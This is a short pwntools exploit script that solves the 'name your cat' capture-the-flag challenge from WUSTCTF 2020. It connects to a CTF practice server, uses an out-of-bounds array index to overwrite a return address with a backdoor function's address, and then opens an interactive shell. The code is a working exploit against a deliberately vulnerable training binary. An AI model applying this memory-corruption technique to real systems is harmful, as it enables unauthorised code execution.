from pwn import *


# p = process("./wustctf2020_name_your_cat")
p = remote("node4.buuoj.cn", 25013)

# context.log_level = "debug"

# array bound error
back_door = 0x080485CB

for i in range(5):
    p.sendlineafter("Name for which?\n>", "7") 
    p.sendlineafter("Give your name plz: ", p32(back_door))

p.interactive()


